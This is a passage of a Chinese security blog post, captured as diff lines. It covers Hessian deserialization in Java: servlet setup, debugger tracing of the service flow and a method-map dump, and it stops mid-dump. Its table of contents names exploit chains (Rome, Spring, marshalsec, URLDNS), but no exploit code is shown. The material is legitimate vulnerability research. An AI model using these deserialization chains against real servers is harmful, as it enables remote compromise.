href="#3-1-Rome%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 Rome利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-1-marshalsec%E7%94%9F%E6%88%90-Exp"><span class="toc-number">3.1.1.</span> <span class="toc-text">3.1.1 marshalsec生成 Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-2-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">3.1.2.</span> <span class="toc-text">3.1.2 利用链分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-3-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-number">3.1.3.</span> <span class="toc-text">3.1.3 二次反序列化不出网利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-SpringPartiallyComparableAdvisorHolder%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 SpringPartiallyComparableAdvisorHolder利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-1-%E7%94%9F%E6%88%90"><span class="toc-number">3.2.1.</span> <span class="toc-text">3.2.1 生成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-2-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">3.2.2.</span> <span class="toc-text">3.2.2 利用链分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-URLDNS-%E6%8A%A5%E9%94%99"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 URLDNS - 报错</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E5%AE%9E%E6%88%98%E5%BA%94%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">4. 实战应用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E5%AE%A1%E8%AE%A1"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-2-%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">4.1.2 远程调用利用</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Hessian反序列化漏洞分析和利用链
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ninefiger</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-03-09T04:00:00.000Z" itemprop="datePublished">2024-03-09</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6/">攻防研究</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Hessian/" rel="tag">Hessian</a>, <a class="tag-link-link" href="/tags/Java/" rel="tag">Java</a>, <a class="tag-link-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>先看一下 GPT 对 Hessian 的介绍<br>Hessian 是一个基于二进制协议的远程调用框架，用于实现不同系统和平台之间的通信。它最初由 Caucho Technology 公司开发，用于在 Java 应用程序之间进行高效的远程调用。Hessian 的设计目标是简单、轻量级、高效，并且跨语言支持。</p>
+<p>Hessian 使用二进制数据格式来序列化和反序列化对象，相比于文本格式（如 XML 或 JSON），二进制格式在网络传输效率上更高。这使得 Hessian 在网络带宽有限或需要更高性能的场景下具有优势。</p>
+<p>Hessian 通过定义接口和实现类的方式，使得远程调用看起来像是本地方法调用一样简单直观。它支持传输任意的 Java 对象，包括基本类型、自定义对象和集合等，同时也支持异常处理和多种数据类型的序列化。</p>
+<p>除了 Java，Hessian 还有其他语言的实现，比如 Python 和 C#，这使得不同语言的系统能够通过 Hessian 进行跨语言的远程调用。这种跨语言的特性使得 Hessian 在分布式系统和微服务架构中得到广泛应用。</p>
+</blockquote>
+<h1 id="1-编写和运行-Hessian"><a href="#1-编写和运行-Hessian" class="headerlink" title="1. 编写和运行 Hessian"></a>1. 编写和运行 Hessian</h1><h2 id="1-1-Servlet"><a href="#1-1-Servlet" class="headerlink" title="1.1 Servlet"></a>1.1 Servlet</h2><p>官网介绍的如何使用<br><img src="/img/Hessian反序列化漏洞分析和利用链/image-20240309121159784.png" alt="image-20240309121159784" style="zoom:50%;" /></p>
+<ul>
+<li><p>导入依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.66<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>服务端 （添加在 SecForJSP项目中）</p>
+</li>
+</ul>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/image-20240309121236409.png" alt="image-20240309121236409"></p>
+<ul>
+<li>Hessian Client</li>
+</ul>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/image-20240309121306522.png" alt="image-20240309121306522"></p>
+<hr>
+<h2 id="1-2-Spring"><a href="#1-2-Spring" class="headerlink" title="1.2 Spring"></a>1.2 Spring</h2><p>可以参考：<a target="_blank" rel="noopener" href="https://www.baeldung.com/spring-remoting-hessian-burlap">https://www.baeldung.com/spring-remoting-hessian-burlap</a></p>
+<h1 id="2-分析和调试-Hessian"><a href="#2-分析和调试-Hessian" class="headerlink" title="2. 分析和调试 Hessian"></a>2. 分析和调试 Hessian</h1><h2 id="2-1-远程调用"><a href="#2-1-远程调用" class="headerlink" title="2.1 远程调用"></a>2.1 远程调用</h2><p>编写服务器端时可以看到，Servlet 继承的 <code>HessianServlet</code>，也是基于 <code>HttpServlet</code> 的</p>
+<ol>
+<li>如下是入口：<code>com.caucho.hessian.server.HessinServlet#service</code>处理流程</li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/image-20240309121318754.png" alt="image-20240309121318754"></p>
+<ol start="2">
+<li>向下继续，看到会读取 Client的 Header 信息，并判断 创建哪种 <code>inputsteam</code> 和 <code>outputStream</code></li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709798650900-dd3e28ef-ffdd-48b2-87bb-6fcc4cd16e44.png" alt="image.png"></p>
+<ol start="3">
+<li>再向下，看到熟悉的 <code>readObject()</code>，但是这个 <code>readObject</code> 是 <code>HessianInput</code> 的 <code>readObject</code>，先继续向下调试</li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709799007929-8d154874-8dc9-4ca5-ac9b-a2539033d04c.png" alt="image.png"></p>
+<ol start="4">
+<li>下面的流程先获取了 <code>Method</code>、参数、反射执行方法并返回结果</li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709799411530-bc1e250e-aca8-4c1a-918d-2fc0eb3b990a.png" alt="image.png"><br>将返回的 result 写入 <code>Hession2Output</code>中，并返回给 <code>Client</code><br><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709867667348-eff746c6-f4ba-4ba1-bc15-05d542be06ff.png" alt="image.png"><br>正常的流程就这些，并不复杂</p>
+<ul>
+<li>补充一下有哪些 <code>method</code> 可以调用</li>
+</ul>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709800441080-49ee525f-e3e7-40e1-882b-9bf61f8ae92a.png" alt="image.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;getServletConfig&quot;</span> -&gt; &#123;Method@<span class="number">4989</span>&#125; <span class="string">&quot;public javax.servlet.ServletConfig javax.servlet.GenericServlet.getServletConfig()&quot;</span></span><br><span class="line"><span class="string">&quot;getClass&quot;</span> -&gt; &#123;Method@<span class="number">4991</span>&#125; <span class="string">&quot;public final native java.lang.Class java.lang.Object.getClass()&quot;</span></span><br><span class="line"><span class="string">&quot;setService_Object&quot;</span> -&gt; &#123;Method@<span class="number">4993</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setService(java.lang.Object)&quot;</span></span><br><span class="line"><span class="string">&quot;setObjectAPI_Class&quot;</span> -&gt; &#123;Method@<span class="number">4995</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setObjectAPI(java.lang.Class)&quot;</span></span><br><span class="line"><span class="string">&quot;log_string_Throwable&quot;</span> -&gt; &#123;Method@<span class="number">4997</span>&#125; <span class="string">&quot;public void javax.servlet.GenericServlet.log(java.lang.String,java.lang.Throwable)&quot;</span></span><br><span class="line"><span class="string">&quot;setLogName__1&quot;</span> -&gt; &#123;Method@<span class="number">4999</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setLogName(java.lang.String)&quot;</span></span><br><span class="line"><span class="string">&quot;hashCode__0&quot;</span> -&gt; &#123;Method@<span class="number">5001</span>&#125; <span class="string">&quot;public native int java.lang.Object.hashCode()&quot;</span></span><br><span class="line"><span class="string">&quot;getServletName__0&quot;</span> -&gt; &#123;Method@<span class="number">5003</span>&#125; <span class="string">&quot;public java.lang.String javax.servlet.GenericServlet.getServletName()&quot;</span></span><br><span class="line"><span class="string">&quot;setObject__1&quot;</span> -&gt; &#123;Method@<span class="number">5005</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setObject(java.lang.Object)&quot;</span></span><br><span class="line"><span class="string">&quot;init_ServletConfig&quot;</span> -&gt; &#123;Method@<span class="number">5007</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.init(javax.servlet.ServletConfig) throws javax.servlet.ServletException&quot;</span></span><br><span class="line"><span class="string">&quot;setObjectAPI__1&quot;</span> -&gt; &#123;Method@<span class="number">4995</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setObjectAPI(java.lang.Class)&quot;</span></span><br><span class="line"><span class="string">&quot;getServletInfo&quot;</span> -&gt; &#123;Method@<span class="number">5010</span>&#125; <span class="string">&quot;public java.lang.String com.caucho.hessian.server.HessianServlet.getServletInfo()&quot;</span></span><br><span class="line"><span class="string">&quot;setObject&quot;</span> -&gt; &#123;Method@<span class="number">5005</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setObject(java.lang.Object)&quot;</span></span><br><span class="line"><span class="string">&quot;getInitParameter_string&quot;</span> -&gt; &#123;Method@<span class="number">5013</span>&#125; <span class="string">&quot;public java.lang.String javax.servlet.GenericServlet.getInitParameter(java.lang.String)&quot;</span></span><br><span class="line"><span class="string">&quot;getInitParameterNames&quot;</span> -&gt; &#123;Method@<span class="number">5015</span>&#125; <span class="string">&quot;public java.util.Enumeration javax.servlet.GenericServlet.getInitParameterNames()&quot;</span></span><br><span class="line"><span class="string">&quot;setHome__1&quot;</span> -&gt; &#123;Method@<span class="number">5017</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setHome(java.lang.Object)&quot;</span></span><br><span class="line"><span class="string">&quot;equals_Object&quot;</span> -&gt; &#123;Method@<span class="number">5021</span>&#125; <span class="string">&quot;public boolean java.lang.Object.equals(java.lang.Object)&quot;</span></span><br><span class="line"><span class="string">&quot;getServletContext__0&quot;</span> -&gt; &#123;Method@<span class="number">5023</span>&#125; <span class="string">&quot;public javax.servlet.ServletContext javax.servlet.GenericServlet.getServletContext()&quot;</span></span><br><span class="line"><span class="string">&quot;destroy__0&quot;</span> -&gt; &#123;Method@<span class="number">5025</span>&#125; <span class="string">&quot;public void javax.servlet.GenericServlet.destroy()&quot;</span></span><br><span class="line"><span class="string">&quot;setSerializerFactory__1&quot;</span> -&gt; &#123;Method@<span class="number">5027</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setSerializerFactory(com.caucho.hessian.io.SerializerFactory)&quot;</span></span><br><span class="line"><span class="string">&quot;setDebug__1&quot;</span> -&gt; &#123;Method@<span class="number">5029</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setDebug(boolean)&quot;</span></span><br><span class="line"><span class="string">&quot;log__2&quot;</span> -&gt; &#123;Method@<span class="number">4997</span>&#125; <span class="string">&quot;public void javax.servlet.GenericServlet.log(java.lang.String,java.lang.Throwable)&quot;</span></span><br><span class="line"><span class="string">&quot;setObject_Object&quot;</span> -&gt; &#123;Method@<span class="number">5005</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setObject(java.lang.Object)&quot;</span></span><br><span class="line"><span class="string">&quot;log__1&quot;</span> -&gt; &#123;Method@<span class="number">5033</span>&#125; <span class="string">&quot;public void javax.servlet.GenericServlet.log(java.lang.String)&quot;</span></span><br><span class="line"><span class="string">&quot;init&quot;</span> -&gt; &#123;Method@<span class="number">5035</span>&#125; <span class="string">&quot;public void javax.servlet.GenericServlet.init() throws javax.servlet.ServletException&quot;</span></span><br><span class="line"><span class="string">&quot;deny&quot;</span> -&gt; &#123;Method@<span class="number">5037</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.deny(java.lang.String)&quot;</span></span><br><span class="line"><span class="string">&quot;sayHello&quot;</span> -&gt; &#123;Method@<span class="number">4841</span>&#125; <span class="string">&quot;public java.lang.String Sec19.HessianService.sayHello(java.lang.String)&quot;</span></span><br><span class="line"><span class="string">&quot;allow_string&quot;</span> -&gt; &#123;Method@<span class="number">5039</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.allow(java.lang.String)&quot;</span></span><br><span class="line"><span class="string">&quot;setWhitelist__1&quot;</span> -&gt; &#123;Method@<span class="number">5041</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setWhitelist(boolean)&quot;</span></span><br><span class="line"><span class="string">&quot;setHomeAPI&quot;</span> -&gt; &#123;Method@<span class="number">5043</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setHomeAPI(java.lang.Class)&quot;</span></span><br><span class="line"><span class="string">&quot;setHomeAPI_Class&quot;</span> -&gt; &#123;Method@<span class="number">5043</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setHomeAPI(java.lang.Class)&quot;</span></span><br><span class="line"><span class="string">&quot;setSendCollectionType__1&quot;</span> -&gt; &#123;Method@<span class="number">5048</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setSendCollectionType(boolean)&quot;</span></span><br><span class="line"><span class="string">&quot;wait_long_int&quot;</span> -&gt; &#123;Method@<span class="number">5019</span>&#125; <span class="string">&quot;public final void java.lang.Object.wait(long,int) throws java.lang.InterruptedException&quot;</span></span><br><span class="line"><span class="string">&quot;setWhitelist&quot;</span> -&gt; &#123;Method@<span class="number">5041</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setWhitelist(boolean)&quot;</span></span><br><span class="line"><span class="string">&quot;setHomeAPI__1&quot;</span> -&gt; &#123;Method@<span class="number">5043</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setHomeAPI(java.lang.Class)&quot;</span></span><br><span class="line"><span class="string">&quot;destroy&quot;</span> -&gt; &#123;Method@<span class="number">5025</span>&#125; <span class="string">&quot;public void javax.servlet.GenericServlet.destroy()&quot;</span></span><br><span class="line"><span class="string">&quot;setHome&quot;</span> -&gt; &#123;Method@<span class="number">5017</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setHome(java.lang.Object)&quot;</span></span><br><span class="line"><span class="string">&quot;getInitParameter__1&quot;</span> -&gt; &#123;Method@<span class="number">5013</span>&#125; <span class="string">&quot;public java.lang.String javax.servlet.GenericServlet.getInitParameter(java.lang.String)&quot;</span></span><br><span class="line"><span class="string">&quot;setAPIClass__1&quot;</span> -&gt; &#123;Method@<span class="number">5055</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setAPIClass(java.lang.Class)&quot;</span></span><br><span class="line"><span class="string">&quot;setWhitelist_boolean&quot;</span> -&gt; &#123;Method@<span class="number">5041</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setWhitelist(boolean)&quot;</span></span><br><span class="line"><span class="string">&quot;wait__0&quot;</span> -&gt; &#123;Method@<span class="number">5058</span>&#125; <span class="string">&quot;public final void java.lang.Object.wait() throws java.lang.InterruptedException&quot;</span></span><br><span class="line"><span class="string">&quot;setLogName&quot;</span> -&gt; &#123;Method@<span class="number">4999</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setLogName(java.lang.String)&quot;</span></span><br><span class="line"><span class="string">&quot;getInitParameter&quot;</span> -&gt; &#123;Method@<span class="number">5013</span>&#125; <span class="string">&quot;public java.lang.String javax.servlet.GenericServlet.getInitParameter(java.lang.String)&quot;</span></span><br><span class="line"><span class="string">&quot;wait__2&quot;</span> -&gt; &#123;Method@<span class="number">5019</span>&#125; <span class="string">&quot;public final void java.lang.Object.wait(long,int) throws java.lang.InterruptedException&quot;</span></span><br><span class="line"><span class="string">&quot;wait__1&quot;</span> -&gt; &#123;Method@<span class="number">5063</span>&#125; <span class="string">&quot;public final native void java.lang.Object.wait(long) throws java.lang.InterruptedException&quot;</span></span><br><span class="line"><span class="string">&quot;setHome_Object&quot;</span> -&gt; &#123;Method@<span class="number">5017</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setHome(java.lang.Object)&quot;</span></span><br><span class="line"><span class="string">&quot;service_ServletRequest_ServletResponse&quot;</span> -&gt; &#123;Method@<span class="number">5066</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.service(javax.servlet.ServletRequest,javax.servlet.ServletResponse) throws java.io.IOException,javax.servlet.ServletException&quot;</span></span><br><span class="line"><span class="string">&quot;notify__0&quot;</span> -&gt; &#123;Method@<span class="number">5068</span>&#125; <span class="string">&quot;public final native void java.lang.Object.notify()&quot;</span></span><br><span class="line"><span class="string">&quot;allow&quot;</span> -&gt; &#123;Method@<span class="number">5039</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.allow(java.lang.String)&quot;</span></span><br><span class="line"><span class="string">&quot;wait&quot;</span> -&gt; &#123;Method@<span class="number">5058</span>&#125; <span class="string">&quot;public final void java.lang.Object.wait() throws java.lang.InterruptedException&quot;</span></span><br><span class="line"><span class="string">&quot;getServletContext&quot;</span> -&gt; &#123;Method@<span class="number">5023</span>&#125; <span class="string">&quot;public javax.servlet.ServletContext javax.servlet.GenericServlet.getServletContext()&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span> -&gt; &#123;Method@<span class="number">4997</span>&#125; <span class="string">&quot;public void javax.servlet.GenericServlet.log(java.lang.String,java.lang.Throwable)&quot;</span></span><br><span class="line"><span class="string">&quot;toString__0&quot;</span> -&gt; &#123;Method@<span class="number">5074</span>&#125; <span class="string">&quot;public java.lang.String java.lang.Object.toString()&quot;</span></span><br><span class="line"><span class="string">&quot;notifyAll&quot;</span> -&gt; &#123;Method@<span class="number">5076</span>&#125; <span class="string">&quot;public final native void java.lang.Object.notifyAll()&quot;</span></span><br><span class="line"><span class="string">&quot;notifyAll__0&quot;</span> -&gt; &#123;Method@<span class="number">5076</span>&#125; <span class="string">&quot;public final native void java.lang.Object.notifyAll()&quot;</span></span><br><span class="line"><span class="string">&quot;sayHello__1&quot;</span> -&gt; &#123;Method@<span class="number">4841</span>&#125; <span class="string">&quot;public java.lang.String Sec19.HessianService.sayHello(java.lang.String)&quot;</span></span><br><span class="line"><span class="string">&quot;getAPIClass__0&quot;</span> -&gt; &#123;Method@<span class="number">5080</span>&#125; <span class="string">&quot;public java.lang.Class com.caucho.hessian.server.HessianServlet.getAPIClass()&quot;</span></span><br><span class="line"><span class="string">&quot;setLogName_string&quot;</span> -&gt; &#123;Method@<span class="number">4999</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setLogName(java.lang.String)&quot;</span></span><br><span class="line"><span class="string">&quot;deny__1&quot;</span> -&gt; &#123;Method@<span class="number">5037</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.deny(java.lang.String)&quot;</span></span><br><span class="line"><span class="string">&quot;setAPIClass&quot;</span> -&gt; &#123;Method@<span class="number">5055</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setAPIClass(java.lang.Class)&quot;</span></span><br><span class="line"><span class="string">&quot;setDebug&quot;</span> -&gt; &#123;Method@<span class="number">5029</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setDebug(boolean)&quot;</span></span><br><span class="line"><span class="string">&quot;deny_string&quot;</span> -&gt; &#123;Method@<span class="number">5037</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.deny(java.lang.String)&quot;</span></span><br><span class="line"><span class="string">&quot;notify&quot;</span> -&gt; &#123;Method@<span class="number">5068</span>&#125; <span class="string">&quot;public final native void java.lang.Object.notify()&quot;</span></span><br><span class="line"><span class="string">&quot;service__2&quot;</span> -&gt; &#123;Method@<span class="number">5066</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.service(javax.servlet.ServletRequest,javax.servlet.ServletResponse) throws java.io.IOException,javax.servlet.ServletException&quot;</span></span><br><span class="line"><span class="string">&quot;setAPIClass_Class&quot;</span> -&gt; &#123;Method@<span class="number">5055</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setAPIClass(java.lang.Class)&quot;</span></span><br><span class="line"><span class="string">&quot;getClass__0&quot;</span> -&gt; &#123;Method@<span class="number">4991</span>&#125; <span class="string">&quot;public final native java.lang.Class java.lang.Object.getClass()&quot;</span></span><br><span class="line"><span class="string">&quot;sayHello_string&quot;</span> -&gt; &#123;Method@<span class="number">4841</span>&#125; <span class="string">&quot;public java.lang.String Sec19.HessianService.sayHello(java.lang.String)&quot;</span></span><br><span class="line"><span class="string">&quot;setSendCollectionType_boolean&quot;</span> -&gt; &#123;Method@<span class="number">5048</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setSendCollectionType(boolean)&quot;</span></span><br><span class="line"><span class="string">&quot;hashCode&quot;</span> -&gt; &#123;Method@<span class="number">5001</span>&#125; <span class="string">&quot;public native int java.lang.Object.hashCode()&quot;</span></span><br><span class="line"><span class="string">&quot;setSerializerFactory_SerializerFactory&quot;</span> -&gt; &#123;Method@<span class="number">5027</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setSerializerFactory(com.caucho.hessian.io.SerializerFactory)&quot;</span></span><br><span class="line"><span class="string">&quot;init__1&quot;</span> -&gt; &#123;Method@<span class="number">5007</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.init(javax.servlet.ServletConfig) throws javax.servlet.ServletException&quot;</span></span><br><span class="line"><span class="string">&quot;init__0&quot;</span> -&gt; &#123;Method@<span class="number">5035</span>&#125; <span class="string">&quot;public void javax.servlet.GenericServlet.init() throws javax.servlet.ServletException&quot;</span></span><br><span class="line"><span class="string">&quot;setSendCollectionType&quot;</span> -&gt; &#123;Method@<span class="number">5048</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setSendCollectionType(boolean)&quot;</span></span><br><span class="line"><span class="string">&quot;getAPIClass&quot;</span> -&gt; &#123;Method@<span class="number">5080</span>&#125; <span class="string">&quot;public java.lang.Class com.caucho.hessian.server.HessianServlet.getAPIClass()&quot;</span></span><br><span class="line"><span class="string">&quot;getSerializerFactory&quot;</span> -&gt; &#123;Method@<span class="number">5099</span>&#125; <span class="string">&quot;public com.caucho.hessian.io.SerializerFactory com.caucho.hessian.server.HessianServlet.getSerializerFactory()&quot;</span></span><br><span class="line"><span class="string">&quot;getServletName&quot;</span> -&gt; &#123;Method@<span class="number">5003</span>&#125; <span class="string">&quot;public java.lang.String javax.servlet.GenericServlet.getServletName()&quot;</span></span><br><span class="line"><span class="string">&quot;setService__1&quot;</span> -&gt; &#123;Method@<span class="number">4993</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setService(java.lang.Object)&quot;</span></span><br><span class="line"><span class="string">&quot;wait_long&quot;</span> -&gt; &#123;Method@<span class="number">5063</span>&#125; <span class="string">&quot;public final native void java.lang.Object.wait(long) throws java.lang.InterruptedException&quot;</span></span><br><span class="line"><span class="string">&quot;log_string&quot;</span> -&gt; &#123;Method@<span class="number">5033</span>&#125; <span class="string">&quot;public void javax.servlet.GenericServlet.log(java.lang.String)&quot;</span></span><br><span class="line"><span class="string">&quot;setObjectAPI&quot;</span> -&gt; &#123;Method@<span class="number">4995</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setObjectAPI(java.lang.Class)&quot;</span></span><br><span class="line"><span class="string">&quot;getServletInfo__0&quot;</span> -&gt; &#123;Method@<span class="number">5010</span>&#125; <span class="string">&quot;public java.lang.String com.caucho.hessian.server.HessianServlet.getServletInfo()&quot;</span></span><br><span class="line"><span class="string">&quot;setService&quot;</span> -&gt; &#123;Method@<span class="number">4993</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setService(java.lang.Object)&quot;</span></span><br><span class="line"><span class="string">&quot;setDebug_boolean&quot;</span> -&gt; &#123;Method@<span 